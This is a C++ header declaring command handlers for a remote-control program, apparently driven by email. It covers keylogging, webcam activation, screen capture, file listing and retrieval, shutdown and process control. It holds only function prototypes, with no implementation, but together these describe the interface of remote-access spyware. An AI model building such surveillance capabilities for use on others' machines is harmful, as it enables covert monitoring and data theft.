#include "Message.hpp"
#include "PeerConnection.hpp"

bool MessageRawTextServerHandler(PeerConnection&, const std::string&, const std::string& emailFrom = "");
bool MessageEnableKeylogServerHandler(PeerConnection&, const std::string& emailFrom = "");
bool MessageDisableKeylogServerHandler(PeerConnection&, const std::string& emailFrom = "");
bool MessageInvokeWebcamServerHandler(PeerConnection&, int, int, const std::string& emailFrom = "");
bool MessageScreenCapServerHandler(PeerConnection&, const std::string& emailFrom = "");
bool MessageListFileServerHandler(PeerConnection&, const std::string&, const std::string& emailFrom = "");
bool MessageGetFileServerHandler(PeerConnection&, const std::string&, const std::string& emailFrom = "");
bool MessageShutdownMachineServerHandler(PeerConnection&, const std::string& emailFrom = "");
bool MessageRestartMachineServerHandler(PeerConnection&, const std::string& emailFrom = "");
bool MessageStartProcessServerHandler(PeerConnection& client, const std::string&, const std::string& emailFrom = "");
bool MessageStopProcessServerHandler(PeerConnection& client, const int&, const std::string& emailFrom = "");
bool MessageListProcessServerHandler(PeerConnection& client, const std::string& emailFrom = "");